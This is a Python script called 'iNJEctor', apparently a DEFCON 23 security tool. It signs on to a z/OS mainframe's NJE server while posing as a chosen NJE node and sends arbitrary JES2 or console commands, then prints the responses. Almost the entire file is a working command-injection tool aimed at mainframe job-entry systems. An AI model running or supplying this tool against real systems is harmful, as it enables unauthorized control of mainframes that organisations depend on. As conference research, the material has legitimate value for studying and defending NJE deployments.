#!/usr/bin/python

## NJE NMR Command Sender
## Allows for sending commands to z/OS NJE
## requires OHOST and RHOST
#
## Created by Soldier of Fortran
#
#########
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#########

import njelib
import argparse
import sys
import signal
import re
#reload(sys)
#sys.setdefaultencoding('utf8')


class c:
    BLUE = '\033[94m'
    DARKBLUE = '\033[0;34m'
    PURPLE = '\033[95m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[1;37m'
    ENDC = '\033[0m'
    DARKGREY = '\033[1;30m'
    

    def disable(self):
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
	self.DARKBLUE = ''
	self.PURPLE = ''
	seld.WHITE= ''
        self.RED = ''
        self.ENDC = ''

def signal_handler(signal, frame):
        print c.ENDC+ "\n( PACMAN Death Sound )\n"
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

print c.GREEN+'''    _ '''+c.RED+'''  _   __      __  ______'''+c.GREEN+'''      __            
   (_)'''+c.RED+''' / | / /     / / / ____/'''+c.GREEN+''' ____/ / ____  _____
  / / '''+c.RED+'''/  |/ / _   / / / __/  '''+c.GREEN+'''/ ___/ __/ __ \/ ___/
 / / '''+c.RED+'''/ /|  / / /_/ / / /___ '''+c.GREEN+'''/ /__/ /_/ /_/ / /    
/_/ '''+c.RED+'''/_/ |_/  \____/ /_____/ '''+c.GREEN+'''\___/\__/\____/_/
     The JES2 NJE Command Injector
     ''' + c.RED + "     DEFCON 23 Edition\n"+ c.ENDC


#start argument parser
parser = argparse.ArgumentParser(description='iNJEctor takes a target host, target NJE hostname and your own NJE hostname and send JES2 commands to the target. Displays the output to stdout.\n See: http://www-01.ibm.com/support/knowledgecenter/SSLTBW_2.1.0/com.ibm.zos.v2r1.hasa200/has2cmdr.htm for a list of commands.')
parser.add_argument('target',help='The z/OS Mainframe NJE Server IP or Hostname')
parser.add_argument('ohost',help='Name of the host you\'re sending the control record as. Note that both ohost and rhost must be valid.')
parser.add_argument('rhost',help='Name of the host you expect to send the command to. Note that both ohost and rhost must be valid.')
parser.add_argument('command',help='JES2 or console command you wish to execute. ')
parser.add_argument('-p','--port',help='The NJE server port. Default is 175', dest='port', default=175, type=int)
parser.add_argument('--pass', help='Use this flag to provide a password for sigon', dest='password', default='')
parser.add_argument('-d','--debug',help='Show debug information. Displays A LOT of information',default=False,dest='debug',action='store_true')
args = parser.parse_args()

nje = njelib.NJE(args.ohost,args.rhost)

if args.debug:
	nje.set_debuglevel(1)


t = nje.signon(host=args.target,port=args.port, timeout=2, password=args.password)

if t:
	print '[+] Signon to', nje.host ,'Complete'
else:
	print '[!] Signon to', nje.host ,'Failed!\n    Enable debugging to see why.'
	sys.exit(-1)

print "[+] Sending Command:", args.command 
r = nje.nmrCommand(args.command)


print "[+] Response Received:\n"
print r




